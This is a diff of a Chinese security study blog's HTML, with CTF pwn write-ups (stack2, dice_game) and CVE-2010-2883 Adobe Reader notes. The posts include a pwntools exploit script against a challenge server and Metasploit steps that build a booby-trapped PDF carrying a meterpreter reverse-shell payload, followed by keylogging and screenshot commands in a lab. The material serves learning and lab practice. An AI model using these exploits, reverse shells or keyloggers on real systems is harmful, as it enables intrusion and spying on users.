+<li>COMMIT语句：<ul>
+<li><code>COMMIT;</code></li>
+</ul>
+</li>
+<li>ROLLBACK语句：<ul>
+<li><code>ROLLBACK;</code><h2 id="0x04-SQL选择"><a href="#0x04-SQL选择" class="headerlink" title="0x04 SQL选择"></a>0x04 SQL选择</h2></li>
+</ul>
+</li>
+</ul>
+
+      
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" rel="tag">学习记录</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-攻防世界-pwn-stack2" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2020/07/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-stack2/" class="article-date">
+      <time datetime="2020-07-27T06:20:52.069Z" itemprop="datePublished">2020-07-27</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/07/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-stack2/">攻防世界-pwn-stack2</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h2 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h2><p>checksec检查：</p>
+<p><img src="https://i.loli.net/2020/07/27/seUw8f5zIvPk9W7.png" alt="捕获.PNG"></p>
+<p>32位，无PIE，开了NX和canary.<br>运行一下是只有五个模块，展示数字，添加，更改，求平均数，退出。</p>
+<p>IDA中查看main函数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  int v3; &#x2F;&#x2F; eax</span><br><span class="line">  unsigned int v5; &#x2F;&#x2F; [esp+18h] [ebp-90h]</span><br><span class="line">  unsigned int v6; &#x2F;&#x2F; [esp+1Ch] [ebp-8Ch]</span><br><span class="line">  int v7; &#x2F;&#x2F; [esp+20h] [ebp-88h]</span><br><span class="line">  unsigned int j; &#x2F;&#x2F; [esp+24h] [ebp-84h]</span><br><span class="line">  int v9; &#x2F;&#x2F; [esp+28h] [ebp-80h]</span><br><span class="line">  unsigned int i; &#x2F;&#x2F; [esp+2Ch] [ebp-7Ch]</span><br><span class="line">  unsigned int k; &#x2F;&#x2F; [esp+30h] [ebp-78h]</span><br><span class="line">  unsigned int l; &#x2F;&#x2F; [esp+34h] [ebp-74h]</span><br><span class="line">  char v13[100]; &#x2F;&#x2F; [esp+38h] [ebp-70h]</span><br><span class="line">  unsigned int v14; &#x2F;&#x2F; [esp+9Ch] [ebp-Ch]</span><br><span class="line">  v14 &#x3D; __readgsdword(0x14u);</span><br><span class="line">  setvbuf(stdin, 0, 2, 0);</span><br><span class="line">  setvbuf(stdout, 0, 2, 0);</span><br><span class="line">  v9 &#x3D; 0;</span><br><span class="line">  puts(&quot;***********************************************************&quot;);</span><br><span class="line">  puts(&quot;*                      An easy calc                       *&quot;);</span><br><span class="line">  puts(&quot;*Give me your numbers and I will return to you an average *&quot;);</span><br><span class="line">  puts(&quot;*(0 &lt;&#x3D; x &lt; 256)                                           *&quot;);</span><br><span class="line">  puts(&quot;***********************************************************&quot;);</span><br><span class="line">  puts(&quot;How many numbers you have:&quot;);</span><br><span class="line">  __isoc99_scanf(&quot;%d&quot;, &amp;v5);</span><br><span class="line">  puts(&quot;Give me your numbers&quot;);</span><br><span class="line">  for ( i &#x3D; 0; i &lt; v5 &amp;&amp; (signed int)i &lt;&#x3D; 0x63; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    __isoc99_scanf(&quot;%d&quot;, &amp;v7);</span><br><span class="line">    v13[i] &#x3D; v7;</span><br><span class="line">  &#125;</span><br><span class="line">  for ( j &#x3D; v5; ; printf(&quot;average is %.2lf\n&quot;, (double)((long double)v9 &#x2F; (double)j)) )</span><br><span class="line">  &#123;</span><br><span class="line">    while ( 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      while ( 1 )</span><br><span class="line">      &#123;</span><br><span class="line">        while ( 1 )</span><br><span class="line">        &#123;</span><br><span class="line">          puts(&quot;1. show numbers\n2. add number\n3. change number\n4. get average\n5. exit&quot;);</span><br><span class="line">          __isoc99_scanf(&quot;%d&quot;, &amp;v6);</span><br><span class="line">          if ( v6 !&#x3D; 2 )</span><br><span class="line">            break;</span><br><span class="line">          puts(&quot;Give me your number&quot;);</span><br><span class="line">          __isoc99_scanf(&quot;%d&quot;, &amp;v7);</span><br><span class="line">          if ( j &lt;&#x3D; 0x63 )</span><br><span class="line">          &#123;</span><br><span class="line">            v3 &#x3D; j++;</span><br><span class="line">            v13[v3] &#x3D; v7;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if ( v6 &gt; 2 )</span><br><span class="line">          break;</span><br><span class="line">        if ( v6 !&#x3D; 1 )</span><br><span class="line">          return 0;</span><br><span class="line">        puts(&quot;id\t\tnumber&quot;);</span><br><span class="line">        for ( k &#x3D; 0; k &lt; j; ++k )</span><br><span class="line">          printf(&quot;%d\t\t%d\n&quot;, k, v13[k]);</span><br><span class="line">      &#125;</span><br><span class="line">      if ( v6 !&#x3D; 3 )</span><br><span class="line">        break;</span><br><span class="line">      puts(&quot;which number to change:&quot;);</span><br><span class="line">      __isoc99_scanf(&quot;%d&quot;, &amp;v5);</span><br><span class="line">      puts(&quot;new number:&quot;);</span><br><span class="line">      __isoc99_scanf(&quot;%d&quot;, &amp;v7);</span><br><span class="line">      v13[v5] &#x3D; v7;</span><br><span class="line">    &#125;</span><br><span class="line">    if ( v6 !&#x3D; 4 )</span><br><span class="line">      break;</span><br><span class="line">    v9 &#x3D; 0;</span><br><span class="line">    for ( l &#x3D; 0; l &lt; j; ++l )</span><br><span class="line">      v9 +&#x3D; v13[l];</span><br><span class="line">  &#125;</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>发现没有检查v13数组边界，当选择3.change number时程序没有对v5进行检测，存在数组越界，产生溢出：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">puts(&quot;which number to change:&quot;);</span><br><span class="line">     __isoc99_scanf(&quot;%d&quot;, &amp;v5);</span><br><span class="line">     puts(&quot;new number:&quot;);</span><br><span class="line">     __isoc99_scanf(&quot;%d&quot;, &amp;v7);</span><br><span class="line">     v13[v5] &#x3D; v7;</span><br></pre></td></tr></table></figure>
+
+<p>发现给了/bin/bash:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">:0804859B ; __unwind &#123;</span><br><span class="line">.text:0804859B                 push    ebp</span><br><span class="line">.text:0804859C                 mov     ebp, esp</span><br><span class="line">.text:0804859E                 sub     esp, 18h</span><br><span class="line">.text:080485A1                 mov     eax, large gs:14h</span><br><span class="line">.text:080485A7                 mov     [ebp+var_C], eax</span><br><span class="line">.text:080485AA                 xor     eax, eax</span><br><span class="line">.text:080485AC                 sub     esp, 0Ch</span><br><span class="line">.text:080485AF                 push    offset command  ; &quot;&#x2F;bin&#x2F;bash&quot;</span><br><span class="line">.text:080485B4                 call    _system ;system</span><br><span class="line">.text:080485B9                 add     esp, 10h</span><br><span class="line">.text:080485BC                 nop</span><br><span class="line">.text:080485BD                 mov     edx, [ebp+var_C]</span><br><span class="line">.text:080485C0                 xor     edx, large gs:14h</span><br><span class="line">.text:080485C7                 jz      short locret_80485CE</span><br><span class="line">.text:080485C9                 call    ___stack_chk_fail</span><br></pre></td></tr></table></figure>
+
+<p>开启动态调试，在v13[v5]=v7处下断点，</p>
+<p><img src="https://i.loli.net/2020/07/31/ClcWPX8p29JHxQk.png" alt="linux输入.PNG"></p>
+<p>转到IDA界面，查看此地址，此时edx存入的即为输入的数字9，在栈中的位置是：</p>
+<p><img src="https://i.loli.net/2020/07/31/j24baYfNMdlRrGD.png" alt="捕获.PNG"></p>
+<p>得到了输入在栈中的位置，找到返回地址的位置覆盖掉就可以了。</p>
+
+      
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-攻防世界-pwn-dice_game" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2020/07/22/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-dice_game/" class="article-date">
+      <time datetime="2020-07-22T09:49:56.548Z" itemprop="datePublished">2020-07-22</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/07/22/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-dice_game/">攻防世界-dice_game</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h2 id="0x01-Checksec"><a href="#0x01-Checksec" class="headerlink" title="0x01 Checksec"></a>0x01 Checksec</h2><p>linux下checksec查壳，开启了relro nx pie防护：</p>
+<p><img src="https://i.loli.net/2020/07/23/z2ZEWmAGM3POHqt.png" alt="pwn-checksec.PNG"></p>
+<h2 id="0x02-分析"><a href="#0x02-分析" class="headerlink" title="0x02 分析"></a>0x02 分析</h2><p>IDA打开，主函数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  char buf[55]; &#x2F;&#x2F; [rsp+0h] [rbp-50h]</span><br><span class="line">  char v5; &#x2F;&#x2F; [rsp+37h] [rbp-19h]</span><br><span class="line">  ssize_t v6; &#x2F;&#x2F; [rsp+38h] [rbp-18h]</span><br><span class="line">  unsigned int seed[2]; &#x2F;&#x2F; [rsp+40h] [rbp-10h]</span><br><span class="line">  unsigned int v8; &#x2F;&#x2F; [rsp+4Ch] [rbp-4h]</span><br><span class="line">  memset(buf, 0, 0x30uLL);</span><br><span class="line">  *(_QWORD *)seed &#x3D; time(0LL);</span><br><span class="line">  printf(&quot;Welcome, let me know your name: &quot;, a2);</span><br><span class="line">  fflush(stdout);</span><br><span class="line">  v6 &#x3D; read(0, buf, 0x50uLL);</span><br><span class="line">  if ( v6 &lt;&#x3D; 49 )</span><br><span class="line">    buf[v6 - 1] &#x3D; 0;</span><br><span class="line">  printf(&quot;Hi, %s. Let&#39;s play a game.\n&quot;, buf);</span><br><span class="line">  fflush(stdout);</span><br><span class="line">  srand(seed[0]);</span><br><span class="line">  v8 &#x3D; 1;</span><br><span class="line">  v5 &#x3D; 0;</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;Game %d&#x2F;50\n&quot;, v8);</span><br><span class="line">    v5 &#x3D; sub_A20();</span><br><span class="line">    fflush(stdout);</span><br><span class="line">    if ( v5 !&#x3D; 1 )</span><br><span class="line">      break;</span><br><span class="line">    if ( v5 )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( v8 &#x3D;&#x3D; 50 )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_B28(buf);</span><br><span class="line">        break;</span><br><span class="line">      &#125;</span><br><span class="line">      ++v8;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  puts(&quot;Bye bye!&quot;);</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>是一个srand函数程序，输入与随机出来的数匹配，则将进入flag的函数。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall sub_B28(__int64 a1)</span><br><span class="line">&#123;</span><br><span class="line">  char s; &#x2F;&#x2F; [rsp+10h] [rbp-70h]</span><br><span class="line">  FILE *stream; &#x2F;&#x2F; [rsp+78h] [rbp-8h]</span><br><span class="line">  printf(&quot;Congrats %s\n&quot;, a1);</span><br><span class="line">  stream &#x3D; fopen(&quot;flag&quot;, &quot;r&quot;);</span><br><span class="line">  fgets(&amp;s, 100, stream);</span><br><span class="line">  puts(&amp;s);</span><br><span class="line">  return fflush(stdout);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在输入name时，令输入数据覆盖srand函数内部随机种子，就可以控制随机数的生成。</p>
+<p><img src="https://i.loli.net/2020/07/23/fxEhB6bCWcH9enR.png" alt="相差40.PNG"></p>
+<p>随机树种子地址与输入名字的buf地址之间相差0x40,所以将seed覆盖掉</p>
+<h2 id="0x03-exp"><a href="#0x03-exp" class="headerlink" title="0x03 exp"></a>0x03 exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from ctypes import *</span><br><span class="line">p&#x3D;remote(&#39;220.249.52.133&#39;,34691)</span><br><span class="line">libc&#x3D;cdll.LoadLibrary(&quot;libc.so.6&quot;)</span><br><span class="line">p.recv()</span><br><span class="line">payload&#x3D;0x40*&#39;a&#39;+p64(0)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">a&#x3D;[]</span><br><span class="line">for i in range(50):</span><br><span class="line">    a.append(libc.rand()%6+1)</span><br><span class="line">print(a)</span><br><span class="line">for i in a:</span><br><span class="line">    p.recv()</span><br><span class="line">    print(p.recv())</span><br><span class="line">    p.sendline(str(i))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+      
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-漏洞战争学习笔记1：CVE-2010-2883" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2020/07/20/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01%EF%BC%9ACVE-2010-2883/" class="article-date">
+      <time datetime="2020-07-20T02:57:14.158Z" itemprop="datePublished">2020-07-20</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/07/20/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01%EF%BC%9ACVE-2010-2883/">漏洞战争学习笔记1：CVE-2010-2883</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h2 id="漏洞背景介绍"><a href="#漏洞背景介绍" class="headerlink" title="漏洞背景介绍"></a>漏洞背景介绍</h2><p>CVE-2010-2883是Adobe Reader 和Acrobat中的CoolType.dll库在解析字体文件SING表中的uniqueName项时存在的栈溢出漏洞，用户受骗打开了特制的pdf文件就有可能导致执行任意代码。</p>
+<h2 id="分析环境"><a href="#分析环境" class="headerlink" title="分析环境"></a>分析环境</h2><p>操作系统：Windows XP SP3<br>调试器：OllyDbg<br>反汇编：IDA pro 7.2<br>目标：Adobe Reader 9.3.0</p>
+<h2 id="0x01-漏洞利用"><a href="#0x01-漏洞利用" class="headerlink" title="0x01 漏洞利用"></a>0x01 漏洞利用</h2><ul>
+<li>攻击机：kali</li>
+<li>靶机：windows xp sp3</li>
+</ul>
+<p>kali机上，打开msfconsole,使用metasploit生成pdf木马文件</p>
+<ul>
+<li>msfconsole -q //进入msf框架</li>
+<li>search cve-2010-2883 //找到漏洞模块</li>
+<li>use exploit/windows/fileformat/adobe_cooltype_sing //使用模块</li>
+<li>set payload windows/meterpreter/reverse_tcp //调用meterpreter载荷，反向连接到渗透机</li>
+<li>set lhost 192.168.119.128 //设置主机ip</li>
+<li>set FileNAME 2883.pdf //设置生产带有后门pdf文件名</li>
+<li>set lport 99999 //设置本地监听端口</li>
+<li>exploit //执行渗透生成文件成功</li>
+</ul>
+<p>将文件拷贝到windows xp（靶机）。</p>
+<p>metasploit开启shell监听会话</p>
+<p><img src="https://i.loli.net/2020/07/20/WvKMtdn3P8bx5cB.png" alt="获取到shell.PNG"></p>
+<ul>
+<li>back</li>
+<li>use exploit/multi/handler //使用hhandler监听模块</li>
+<li>set payload windows/meterpreter/reverse_tcp</li>
+<li>set lhost 192.168.119.128 //设置及监听IP地址（kali）</li>
+<li>set lport 9999 //设置监听的端口（与pdg文件一致）</li>
+<li>exploit //开启监听</li>
+</ul>
+<p>靶机打开2883.pdf文件，kali端即可获取shell会话。</p>
+<ul>
+<li>sysinfo //查看系统信息</li>
+<li>getuid //查看当前用户</li>
+<li>screenshot //截屏查看靶机桌面</li>
+<li>ps //查看进程</li>
+<li>migrate 148 //切换进程到148 </li>
+<li>shell //获取到Dos shell</li>
+<li>keyscan_start //开启键盘记录</li>
+<li>keyscan_dump //输出键盘记录</li>
+</ul>
+<h2 id="0x02-基于字符串定位的漏洞分析方法"><a href="#0x02-基于字符串定位的漏洞分析方法" class="headerlink" title="0x02 基于字符串定位的漏洞分析方法"></a>0x02 基于字符串定位的漏洞分析方法</h2><h3 id="IDA静态分析"><a href="#IDA静态分析" class="headerlink" title="IDA静态分析"></a>IDA静态分析</h3><p>打开cooltype.dll，alt+t搜索“SING”，依次进入检查是否有敏感信息，大概是第二个SING,发现调用函数sttrcat，在拼接字符串时未进行长度检查，可能会造成栈溢出，strcat为溢出点。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">.text:0803DBF2                 push    ebp</span><br><span class="line">.text:0803DBF3                 sub     esp, 104h       ; 分配栈空间0x104h</span><br><span class="line">.text:0803DBF9                 lea     ebp, [esp-4]    ; 后面的strcat会将执行结果保存在ebp中，strcat的目的地</span><br><span class="line">.text:0803DBFD                 mov     eax, ___security_cookie ；安全cookie</span><br><span class="line">.text:0803DC02                 xor     eax, ebp ;cookie^ebp(sep-4);</span><br><span class="line">.text:0803DC04                 mov     [ebp+108h+var_4], eax ;将cookie保存到栈，以作安全检查</span><br><span class="line">.text:0803DC0A                 push    4Ch</span><br><span class="line">.text:0803DC0C                 mov     eax, offset loc_81847C4</span><br><span class="line">.text:0803DC11                 call    __EH_prolog3_catch</span><br><span class="line">.text:0803DC16                 mov     eax, [ebp+108h+arg_C]</span><br><span class="line">.text:0803DC1C                 mov     edi, [ebp+108h+arg_0]</span><br><span class="line">.text:0803DC22                 mov     ebx, [ebp+108h+arg_4]</span><br><span class="line">.text:0803DC28                 mov     [ebp+108h+var_130], edi</span><br><span class="line">.text:0803DC2B                 mov     [ebp+108h+var_138], eax</span><br><span class="line">.text:0803DC2E                 call    sub_8041626</span><br><span class="line">.text:0803DC33                 xor     esi, esi</span><br><span class="line">.text:0803DC35                 cmp     dword ptr [edi+8], 3</span><br><span class="line">.text:0803DC39 ;   try &#123;</span><br><span class="line">.text:0803DC39                 mov     [ebp+108h+var_10C], esi</span><br><span class="line">.text:0803DC3C                 jz      loc_803DDF9</span><br><span class="line">.text:0803DC42                 mov     [ebp+108h+var_124], esi</span><br><span class="line">.text:0803DC45                 mov     [ebp+108h+var_120], esi</span><br><span class="line">.text:0803DC48                 cmp     dword ptr [edi+0Ch], 1</span><br><span class="line">.text:0803DC48 ;   &#125; &#x2F;&#x2F; starts at 803DC39</span><br><span class="line">.text:0803DC4C ;   try &#123;</span><br><span class="line">.text:0803DC4C                 mov     byte ptr [ebp+108h+var_10C], 1</span><br><span class="line">.text:0803DC50                 jnz     loc_803DDA2</span><br><span class="line">.text:0803DC56                 push    offset aName    ; &quot;name&quot;</span><br><span class="line">.text:0803DC5B                 push    edi             ; int</span><br><span class="line">.text:0803DC5C                 lea     ecx, [ebp+108h+var_124]</span><br><span class="line">.text:0803DC5F                 mov     [ebp+108h+var_119], 0</span><br><span class="line">.text:0803DC63                 call    sub_802178F</span><br><span class="line">.text:0803DC68                 cmp     [ebp+108h+var_124], esi</span><br><span class="line">.text:0803DC6B                 jnz     short loc_803DCD6</span><br><span class="line">.text:0803DC6D                 push    offset aSing    ; &quot;SING&quot;</span><br><span class="line">.text:0803DC72                 push    edi             ; int</span><br><span class="line">.text:0803DC73                 lea     ecx, [ebp+108h+var_12C] ; ecx传参，thiscall调用约定，推测指向sing表入口</span><br><span class="line">.text:0803DC76                 call    sub_8021ABE     ; 处理sing表</span><br><span class="line">.text:0803DC7B                 mov     eax, [ebp+108h+var_12C] ；SING表地址给eax</span><br><span class="line">.text:0803DC7E                 cmp     eax, esi        ; 判断是否为空</span><br><span class="line">.text:0803DC7E ;   &#125; &#x2F;&#x2F; starts at 803DC4C</span><br><span class="line">.text:0803DC80 ;   try &#123;</span><br><span class="line">.text:0803DC80                 mov     byte ptr [ebp+108h+var_10C], 2</span><br><span class="line">.text:0803DC84                 jz      short loc_803DCBD ; 不跳转</span><br><span class="line">.text:0803DC86                 mov     ecx, [eax]      ; 字体资源版本号，这里为1.0版本，即00 10 00 00</span><br><span class="line">.text:0803DC88                 and     ecx, 0FFFFh</span><br><span class="line">.text:0803DC8E                 jz      short loc_803DC98 ; 跳转</span><br><span class="line">.text:0803DC90                 cmp     ecx, 100h</span><br><span class="line">.text:0803DC96                 jnz     short loc_803DCB9</span><br><span class="line">.text:0803DC98</span><br><span class="line">.text:0803DC98 loc_803DC98:                            ; CODE XREF: sub_803DBF2+9C↑j</span><br><span class="line">.text:0803DC98                 add     eax, 10h        ; 相对sing表入口偏移0x10处找到uniqueName</span><br><span class="line">.text:0803DC9B                 push    eax             ; Source 源地址，长度不固定</span><br><span class="line">.text:0803DC9C                 lea     eax, [ebp+108h+Dest] ；eax&#x3D;ebp+108-108&#x3D;ebp;ebp&#x3D;esp-4,即复制到栈顶部位置</span><br><span class="line">.text:0803DC9F                 push    eax             ; Dest 目的地址：固定大小的栈空间</span><br><span class="line">.text:0803DCA0                 mov     [ebp+108h+Dest], 0 ；清0</span><br><span class="line">.text:0803DCA4                 call    strcat          ; 未检查大小，造成溢出</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>GS:由IDA汇编分析，函数开始出有安全cookie，判定存在GS机制。<br>DEP:数据执行保护，即没有执行权限的内存空间不允许执行代码。<br>ASLR:地址空间布局随机化，包含映像随机化与堆栈随机化，010Editor打开目标exe，找到相关字段，发现已开启。</p>
+</blockquote>
+<p><img src="https://i.loli.net/2020/07/24/aLpHZ9y4qbc7dAu.png" alt="图片.png"></p>
+<h3 id="SING表结构分析"><a href="#SING表结构分析" class="headerlink" title="SING表结构分析"></a>SING表结构分析</h3><p>在kali生成的msf.pdf文件，使用PdfStreamDumper打开，在第十个Stream中找到Sing字段，将整合各Stream另存为TTF文件。</p>
+<p><img src="https://i.loli.net/2020/07/24/fEzYQ4GMuwoDvP3.png" alt="工具找到sing字段.PNG"></p>
+<p><img src="https://i.loli.net/2020/07/24/41Jd3hzA8G6fyYw.png" alt="捕获.PNG"><br>官方文档中对TableEntry结构的定义：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">typedef sturct_SING</span><br><span class="line">&#123;</span><br><span class="line">char tag[4]; &#x2F;&#x2F;标记：“SING”</span><br><span class="line">ULNG checkSum; &#x2F;&#x2F;校验和：“0xD9BCC8B5”</span><br><span class="line">ULNG offset; &#x2F;&#x2F;相对文件的偏移：“0x0000011C”</span><br><span class="line">ULONG length; &#x2F;&#x2F;数据长度：“0x00001DDF”</span><br><span class="line">&#125;TableEntry;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/07/24/J8laM9DIOiYHeg7.png" alt="TTF的tableentry结构.PNG"></p>
